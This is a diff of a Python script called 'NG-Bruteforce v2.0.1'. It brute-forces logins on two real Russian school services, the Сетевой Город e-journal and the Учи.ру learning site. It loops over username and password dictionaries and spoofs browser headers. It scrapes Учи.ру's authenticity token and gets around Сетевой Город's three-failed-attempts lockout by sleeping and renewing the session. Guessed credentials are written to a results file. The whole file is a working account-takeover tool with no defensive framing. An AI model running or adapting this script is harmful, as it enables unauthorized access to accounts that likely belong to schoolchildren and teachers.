@@ -1,9 +1,11 @@
-import requests, os, time, sys, json
+import requests, os, time, sys, json, re
+import urllib.parse
 from hashlib import md5
 
-title = " NG-Bruteforce v2.0.0"
+title = " NG-Bruteforce v2.0.1"
 
-def getauthdata(config):
+
+def ng_getauthdata(config):
     session = requests.Session()
     response = session.post("https://" + config["url"] + "/webapi/auth/getdata")
     if response.status_code==200:
@@ -12,22 +14,22 @@ def getauthdata(config):
                 NSSESSIONID = c.value
         return [session, response.json().pop('salt'), response.json().pop('lt'), response.json().pop('ver'), NSSESSIONID]
 
-def trytologin(session, username, password, config, NSSESSIONID, salt, lt, ver):
+def ng_trytologin(session, username, password, config, NSSESSIONID, salt, lt, ver):
     login_headers = {
-        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
-        "Accept":"application/json, text/javascript, */*; q=0.01",
-        "Accept-Language":"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3",
-        "Accept-Encoding":"gzip, deflate,br",
-        "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
-        "X-Requested-With":"XMLHttpRequest",
-        "Origin":"https://" + config["url"],
-        "Connection":"keep-alive",
-        "Referer":"https://" + config["url"] + "/",
-        "Cookie":"NSSESSIONID=" + NSSESSIONID,
-        "Sec-Fetch-Dest":"empty",
-        "Sec-Fetch-Mode":"cors",
-        "Sec-Fetch-Site":"same-origin",
-        "TE":"trailers",
+            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
+            "Accept":"application/json, text/javascript, */*; q=0.01",
+            "Accept-Language":"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3",
+            "Accept-Encoding":"gzip, deflate,br",
+            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
+            "X-Requested-With":"XMLHttpRequest",
+            "Origin":"https://" + config["url"],
+            "Connection":"keep-alive",
+            "Referer":"https://" + config["url"] + "/",
+            "Cookie":"NSSESSIONID=" + NSSESSIONID,
+            "Sec-Fetch-Dest":"empty",
+            "Sec-Fetch-Mode":"cors",
+            "Sec-Fetch-Site":"same-origin",
+            "TE":"trailers",
     }
     encoded_password = md5(password.encode('windows-1251')).hexdigest().encode()
     pw2 = md5(salt.encode() + encoded_password).hexdigest()
@@ -40,7 +42,7 @@ def trytologin(session, username, password, config, NSSESSIONID, salt, lt, ver):
     else:
         return str(response.json())
 
-def trytologout(config, session):
+def ng_trytologout(config, session):
     logout_headers = {
         "Host":config["url"],
         "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
@@ -58,6 +60,35 @@ def trytologout(config, session):
     session.post("https://" + config["url"] + "/asp/logout.asp", headers=logout_headers)
     session.close()
 
+def ur_trytologin(session, login, password):
+    raw_page = session.get("https://uchi.ru").text.split("<")
+    login_headers = {
+        'Host': 'uchi.ru',
+        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0',
+        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+        'Accept-Language':'en-US,en;q=0.5',
+        'Accept-Encoding':'gzip, deflate, br',
+        'Content-Type':'application/x-www-form-urlencoded',
+        'Origin':'https://uchi.ru',
+        'Connection':'keep-alive',
+        'Referer':'https://uchi.ru/',
+        'Cookie': str(session.cookies.get_dict()).replace("{", "").replace("}", "").replace("': '", "=").replace(",", ";").replace("'", ""),
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode':'navigate',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-User': '?1',
+    }
+    for line in raw_page:
+        if 'name="authenticity_token"' in line:
+            token = re.findall(r"name=\"authenticity_token\" value=\"[^\"]*\"", line)[0].split('name="authenticity_token" value="')[1].split('"')[0]
+    raw_data = "utf8=✓&authenticity_token="+urllib.parse.quote(token)+"&next=%2Fhome&login="+urllib.parse.quote(login)+"&password="+urllib.parse.quote(password)
+    response = session.post("https://uchi.ru", data=raw_data.encode(), headers=login_headers)
+    if "Expires" in str(response.headers):
+        return True
+    else:
+        return False
+
 def login_succ(username, password, logfile): 
     print("Success: " + password)
     open(logfile, "a").write("\n" + username + ":" + password)
@@ -71,8 +102,11 @@ def clear():
 
 print(title)
 print()
-print(" Make your own config from <url>/webapi/login")
-config = json.loads(open(input("Config file: ")).read())
+print(" Mode: ")
+print("1) Сетевой Город")
+print("2) Учи.ру")
+mode = input("Mode: ")
+if mode!="1" and mode!="2": sys.exit(0)
 usernames = input("Usernames file: ")
 passwords = input("Dictionary file: ")
 logfile = input("Results file: ")
@@ -84,24 +118,42 @@ try:
 except FileNotFoundError:
     sys.exit()
 
-authdata = getauthdata(config)
-for username in usernames:
-    clear()
-    print(title)
-    print()
-    print("Username: " + username)
-    for password in passwords:
-        login_response = trytologin(authdata[0], username, password, config, authdata[4], authdata[1], authdata[2], authdata[3])
-        if login_response==False: continue
-        if "Вы совершили 3 неудачные попытки входа. Следующая попытка может быть совершена не ранее чем через минуту" in login_response:
-            print("Requests limit. 1 minute sleep...")
-            time.sleep(61)
-            authdata = getauthdata(config)
-            login_response = trytologin(authdata[0], username, password, config, authdata[4], authdata[1], authdata[2], authdata[3])
+if mode=="1": # Сетевой город
+    print(" Make your own config from <url>/webapi/login response data")
+    config = json.loads(open(input("Config file: ")).read())
+    authdata = ng_getauthdata(config)
+    for username in usernames:
+        clear()
+        print(title)
+        print()
+        print("Username: " + username)
+        for password in passwords:
+            login_response = ng_trytologin(authdata[0], username, password, config, authdata[4], authdata[1], authdata[2], authdata[3])
             if login_response==False: continue
-        if "Ошибка входа в систему.\nПожалуйста, обновите в браузере страницу входа в систему" in login_response:
-            authdata = getauthdata(config) # make new session
-            login_response = trytologin(authdata[0], username, password, config, authdata[4], authdata[1], authdata[2], authdata[3])
-            if login_response==False: continue
-        trytologout(config, authdata[0])
-        login_succ(username, password, logfile)
+            if "Вы совершили 3 неудачные попытки входа. Следующая попытка может быть совершена не ранее чем через минуту" in login_response:
+                print("Requests limit. 1 minute sleep...")
+                time.sleep(61)
+                authdata = ng_getauthdata(config)
+                login_response = ng_trytologin(authdata[0], username, password, config, authdata[4], authdata[1], authdata[2], authdata[3])
+                if login_response==False: continue
+            if "Ошибка входа в систему.\nПожалуйста, обновите в браузере страницу входа в систему" in login_response:
+                authdata = ng_getauthdata(config) # make new session
+                login_response = ng_trytologin(authdata[0], username, password, config, authdata[4], authdata[1], authdata[2], authdata[3])
+                if login_response==False: continue
+            ng_trytologout(config, authdata[0])
+            login_succ(username, password, logfile)
+elif mode=="2": # Учи.ру
+    session = requests.Session()
+    for username in usernames:
+        clear()
+        print(title)
+        print()
+        print("Username: " + username)
+        for password in passwords:
+            login_answer = ur_trytologin(session, username, password)
+            if login_answer==True:
+                login_succ(username, password, logfile)
+            elif login_answer==False:
+                print("Wrong: " + password)
+            else:
+                print("Unknown: " + login_answer)
